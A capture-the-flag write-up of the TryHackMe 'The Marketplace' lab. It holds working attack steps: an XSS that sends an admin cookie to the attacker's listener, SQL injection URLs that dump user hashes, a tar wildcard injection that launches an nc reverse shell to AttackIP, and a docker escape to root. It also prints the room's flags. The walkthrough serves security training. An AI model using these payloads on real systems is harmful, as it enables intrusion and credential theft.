<p align="center">May 7, 2025<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{366}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>.<br><br>
<img width="300px" src="https://github.com/user-attachments/assets/0777af49-4451-436f-a4d3-d6201892944c" alt="Your Image Badge"><br></p>
<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{The Marketplace}}$$</h1>
<p align="center"><em>Can you take over The Marketplace's infrastructure?</em>.<br>
It is classified as a mediumlevel walkthrough.<br>
You can join it for 🆓 using your own virtual machine with openVPN or TryHackMe´s AttackBox if you are subscribed.<br>
Can be accessed clicking  <a href="https://tryhackme.com/room/marketplace">here</a>.</p>

<p align="center"> <img width="1000px" src="https://github.com/user-attachments/assets/8815edcb-552d-4ad4-807a-bd9c1b9a8dc3"> </p>


<br>
<br>

<h2>Task 1 . The Marketplace</h2>
<p>The sysadmin of The Marketplace, Michael, has given you access to an internal server of his, so you can pentest the marketplace platform he and his team has been working on. He said it still has a few bugs he and his team need to iron out.<br><br>

Can you take advantage of this and will you be able to gain root access on his server?</p>


<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

> 1.1. <em>What is flag 1?</em><a id='1.1'></a>
>> <code><strong>THM{c37a63895910e478f28669b048c348d5}</strong></code><br>

<br>

> 1.2. <em>What is flag 2? (User.txt)</em><a id='1.2'></a>
>> <code><strong>THM{c3648ee7af1369676e3e4b15da6dc0b4}</strong></code><br>

<br>

> 1.3. <em>What is flag 3? (User.txt)</em><a id='1.3'></a>
>> <code><strong>THM{d4f76179c80c0dcf46e0f8e43c9abd62}</strong></code><br>

<br>


<h3>---------- nmap -----------</h3>

<br>

```bash
:~/TheMarketplace# nmap -sC -sV -Pn -p- -T4 TargetIP
...
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp    open  http    nginx 1.19.2
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-server-header: nginx/1.19.2
|_http-title: The Marketplace
32768/tcp open  http    Node.js (Express middleware)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: The Marketplace
...
```

<h3>-------- gobuster ---------</h3>

<br>

```bash
:~/TheMarketplace# gobuster dir -u http://TargetIP -w /usr/share/dirb/wordlists/common.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://TargetIP
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
...
/images               (Status: 301) [Size: 179] [--> /images/]
/login                (Status: 200) [Size: 857]
/Login                (Status: 200) [Size: 857]
/messages             (Status: 302) [Size: 28] [--> /login]
/new                  (Status: 302) [Size: 28] [--> /login]
/robots.txt           (Status: 200) [Size: 31]
/signup               (Status: 200) [Size: 667]
/stylesheets          (Status: 301) [Size: 189] [--> /stylesheets/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

<h3>-------- gobuster ---------</h3>

<br>

```bash
:~/TheMarketplace# gobuster dir -u http://TargetIP:32768/ -w /usr/share/dirb/wordlists/common.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://TargetIP:32768/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 403) [Size: 392]
/Admin                (Status: 403) [Size: 392]
/ADMIN                (Status: 403) [Size: 392]
/images               (Status: 301) [Size: 179] [--> /images/]
/login                (Status: 200) [Size: 857]
/Login                (Status: 200) [Size: 857]
/messages             (Status: 302) [Size: 28] [--> /login]
/new                  (Status: 302) [Size: 28] [--> /login]
/robots.txt           (Status: 200) [Size: 31]
/signup               (Status: 200) [Size: 667]
/stylesheets          (Status: 301) [Size: 189] [--> /stylesheets/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

<h3>------ <code>/robots.txt</code>, <code>/signup</code> and <code>/login</code> -------</h3>

<br>



```bash
:~/TheMarketplace# curl http://TargetIP:32768/robots.txt
User-Agent: *
Disallow: /admin
:~/TheMarketplace# curl http://TargetIP:32768/signup
<!DOCTYPE html>
<html>
  <head>
    <title>Sign up</title>
    <link rel='stylesheet' href='/stylesheets/style.css' />
  </head>
  <body>
    <nav>
    <b>The Marketplace</b>
  <div class="right">
    <a href="/">Home</a> |
  
      <a href="/login">Log in</a> |
      <a href="/signup">Sign up</a>
    
  </div>
</nav>

      <h1 style="text-align: center">Sign up</h1>
      <div id="login">
         
        <form method="POST">
          <input type="text" name="username" placeholder="Username" />
          <input type="password" name="password" placeholder="Password" />
          <input type="submit" />
        </form>
      
      </div>
  </body>
</html>
:~/TheMarketplace# curl http://TargetIP:32768/login
<!DOCTYPE html>
<html>
  <head>
    <title>Log in</title>
    <link rel='stylesheet' href='/stylesheets/style.css' />
  </head>
  <body>
    <nav>
    <b>The Marketplace</b>
  <div class="right">
    <a href="/">Home</a> |
  
      <a href="/login">Log in</a> |
      <a href="/signup">Sign up</a>
    
  </div>
</nav>

      <h1 style="text-align: center">Log in</h1>
      <div id="login">
         
        <form method="POST">
          <input type="text" name="username" placeholder="Username" />
          <input type="password" name="password" placeholder="Password" />
          <input type="submit" />
        </form>
      
      </div>
      <script>
        if(document.location.hash.substr(1)) {
          document.querySelector('h1').innerText = decodeURIComponent(document.location.hash.substr(1))
        }
      </script>
  </body>
</html>
TargetIP:~/TheMarketplace# 
```

<br>


<h3>------ <code>http://TargetIP</code> -------</h3>

<br>

![image](https://github.com/user-attachments/assets/b7a6ba0a-6410-47f0-8d44-a12d0ae88914)

<br>


<h3>------ <code>http://TargetIP/item/1</code> -------</h3>

<br>

![image](https://github.com/user-attachments/assets/a45864de-d9a7-4cb7-b0ae-772e92d80f2d)


<br>


<h3>------ <code>http://TargetIP/login</code> -------</h3>

<br>

![image](https://github.com/user-attachments/assets/8ebe791b-8e46-485b-8ba8-29985f7d760e)

<br>


<h3>------ <code>http://TargetIP/item/2</code> -------</h3>

<br>

![image](https://github.com/user-attachments/assets/b9caa7b9-3f56-4da8-8935-0131e693c7b9)


<br>


<h3>------ <code>http://TargetIP/signup</code> -------</h3>

<br>

![image](https://github.com/user-attachments/assets/bd761bad-8887-409f-8433-2934c1192ecb)

<br>


<h3>------ <code>http://TargetIP/new</code> -------</h3>

<br>

![image](https://github.com/user-attachments/assets/a3473d99-c341-4bf6-8a16-33e44060510b)


<br>


<h3>------ Launched <code>Burp Suite</code> and enabled <code>FoxyProxy</code> -------</h3>

<br>

<p>Registered an account successfully.</p>

<br>

![image](https://github.com/user-attachments/assets/583be618-294e-41ec-a703-f521478528ef)


<br>

<p>Logged in.</p>

<br>


![image](https://github.com/user-attachments/assets/c338fd53-c92c-4d25-b61f-0624f486bd84)


<br>

<p>Clicked <code>New listing</code>.</p>

<br>

![image](https://github.com/user-attachments/assets/b222248e-5263-4e30-bd24-2dc6e2986528)


<br>

<p>Crafted a payload.</p>

<br>

```bash
<?php
    header('Location: http://targetIP/admin');

    if (isset($_GET['c'])) {
        $cookie = $_GET['c'];
        $file = fopen('cookie.txt', 'a+');
        fwrite($file, $cookie);
    }
?>

```

```bash
:~/TheMarketplace# python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
TargetIP - - [07/May/2025 ...] "GET /?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoicmVzZWFyY2hlciIsImFkbWluIjpmYWxzZSwiaWF0IjoxNzQ2NjQ2NTY2fQ.FyD-lpGWzXrbjLPzOUTohVFm1tV20TZ_1BrzIlZEnYI HTTP/1.1" 200 -
```

<p>Clicked <code>Report listings to admins</code>.<br><br>
<p>Clicked <code>Report</code>.</p></p>


![image](https://github.com/user-attachments/assets/68e35746-13cd-426b-9ccb-741b349ef380)


```bash

:~/TheMarketplace# python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
TargetIP - - [07/May/2025 ...] "GET /?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoicmVzZWFyY2hlciIsImFkbWluIjpmYWxzZSwiaWF0IjoxNzQ2NjQ2NTY2fQ.FyD-lpGWzXrbjLPzOUTohVFm1tV20TZ_1BrzIlZEnYI HTTP/1.1" 200 -
TargetIP - - [07/May/2025 ...] "GET /?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE3NDY2NDkyNzJ9.xCEtDftQvzJRp9l4Bnl2I6drhuuvavtejDByhCKIpGc HTTP/1.1" 200 -
```

<p>Substituted the cookie.</p>

![image](https://github.com/user-attachments/assets/933db6fe-a921-46f1-94d2-bdf00cad1136)

<br>

<p>Refreshed the web page.</p>

![image](https://github.com/user-attachments/assets/dc91d6de-465f-470e-8c35-0856ec6f1aa7)

<p>Discovered the first flag.</p>

![image](https://github.com/user-attachments/assets/7de4634d-bc5a-43b1-aeb4-efc7158cdd03)

<p>Clicked <code>jake</code>.</p>

![image](https://github.com/user-attachments/assets/6d5c7c4b-265a-4ac5-80f0-1f8c81f92f93)

<p>There is a SQli because I used <code>TragetIP:32768/admin?user=1</code> and got the below outcome.</p>

![image](https://github.com/user-attachments/assets/1e4e4a9e-d4da-4708-8cac-e899ac02e8a3)

<p><code>http://TargetIP:32768/admin?user=0%20UNION%20SELECT%201,group_concat(schema_name),3,4%20FROM%20information_schema.schemata--</code></p>

![image](https://github.com/user-attachments/assets/3e9aca2f-f8e6-484e-b7e0-8a47383a38e5)

<p><code>http://TargetIP:32768/admin?user=0%20UNION%20SELECT%201,group_concat(table_name),3,4%20FROM%20information_schema.tables%20WHERE%20table_schema=%27marketplace%27--</code></p>

![image](https://github.com/user-attachments/assets/ceede8a4-9ec1-479d-bef4-7136e001fa8e)

<p><code>http://TargetIP:32768/admin?user=0%20UNION%20SELECT%201,group_concat(column_name),3,4%20FROM%20information_schema.columns%20WHERE%20table_name=%27messages%27--</code></p>

![image](https://github.com/user-attachments/assets/914bd29d-2ede-4ae2-86a4-91df25bdda1f)

<p><code>http://TargetIP:32768/admin?user=0%20UNION%20SELECT%201,group_concat(id,%20%27~~%27%20,message_content,%20%27~~%27%20,user_from,%20%27~~%27%20,user_to),3,4%20FROM%20messages--</code></p>


![image](https://github.com/user-attachments/assets/abc77e4c-9f45-42d1-840a-e5b8db12c92c)

<p><code>http://TargetIP:32768/admin?user=0%20UNION%20SELECT%201,group_concat(column_name),3,4%20FROM%20information_schema.columns%20WHERE%20table_name=%27users%27--</code></p>


![image](https://github.com/user-attachments/assets/bb50b5d9-fd30-4ec3-addf-0e7061b0228d)

<p><code>http://TargetIP:32768/admin?user=0%20UNION%20SELECT%201,group_concat(id,%27~%27,username,%27~%27,password),3,4%20FROM%20users--</code></p>

![image](https://github.com/user-attachments/assets/59695fc7-4bdf-491b-84a3-4e0198be1eb3)

<br>

<p><code>jake</code>:<code>$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG</code> --> <code>@b_ENXkGYUCAv3zJ</code></p>

<br>


<p><code>ssh jake@TargetIP</code>/p>


<br>

```bash
jake@the-marketplace:~$ pwd
/home/jake
jake@the-marketplace:~$ ls
user.txt
jake@the-marketplace:~$ cat user.txt
THM{c3648ee7af1369676e3e4b15da6dc0b4}
jake@the-marketplace:~$ sudo -l
Matching Defaults entries for jake on the-marketplace:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
jake@the-marketplace:~$ cat /opt/backups/backup.sh
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
jake@the-marketplace:~$ cd /opt/backups
jake@the-marketplace:/opt/backups$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc AttackIP 5555 >/tmp/f" > shell.sh
jake@the-marketplace:/opt/backups$ echo "" > "--checkpoint-action=exec=sh shell.sh"
jake@the-marketplace:/opt/backups$ echo "" > --checkpoint=1
jake@the-marketplace:/opt/backups$ sudo -u michael ./backup.sh
Backing up files...
tar: backup.tar: file is the archive; not dumped
```
<br>

```bash
:~/TheMarketplace# nc -lnvp 5555
...
$ id
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
$ python -c 'import pty; pty.spawn("/bin/bash")'
michael@the-marketplace:/opt/backups$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
t /mnt shn -v /:/mnt --rm -it alpine chroot
# whoami
whoami
root
# pwd
pwd
/
# ls /root
ls /root
root.txt
# cat /root/root.txt
cat /root/root.txt
THM{d4f76179c80c0dcf46e0f8e43c9abd62}
# 
```

<br>
<br>


<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Module Completed: Starters}}$$</h1>
<br>
<p align="center">
<img width="1000px" src="https://github.com/user-attachments/assets/47c279e1-029d-4b23-a4c3-d626527b1a33"></p>


<br>
<br>

<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Room Completed}}$$</h1>
<br>
<p align="center">
<img width="1000px" src="https://github.com/user-attachments/assets/a723b82d-8bbc-4536-bfe4-7e3a5501852f"><br>
<img width="1000px" src="https://github.com/user-attachments/assets/764d17f7-4c7d-4218-8e4d-71755c30f4c8"></p>


<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{My TryHackMe Journey}}$$ </h1>
<br>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| May 7, 2025       | 360      |     234ᵗʰ    |      6ᵗʰ     |     613ʳᵈ   |    12ⁿᵈ    |  100,219 |    715    |     62    |

</div>

<br>


![image](https://github.com/user-attachments/assets/136a2efe-02a4-4c10-a669-cdb2e01b722f)


<p align="center"> Global All Time:  234ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/1387e7a6-7543-4986-a556-8edcc5d58ff2"> </p>

<p align="center"> Brazil All Time:   613ʳᵈ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/7f0b1316-cbac-4592-8ab1-1c8627bc8cf9"> </p>

<p align="center"> Global monthly:     613ʳᵈ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/136a2efe-02a4-4c10-a669-cdb2e01b722f"> </p>

<p align="center"> Brazil monthly:    12ⁿᵈ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/ee626c94-87a2-4d98-858e-e363a310bec1"> </p>

<br>
<br>


<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Thanks for coming!!!}}$$</h1>

<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 

<br>

<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Thank you}}$$</h1>
<p align="center"><a href="https://tryhackme.com/p/jammy">jammy</a> for investing your time and effort to develop this challenge so that I could sharpen my skills!</p> 
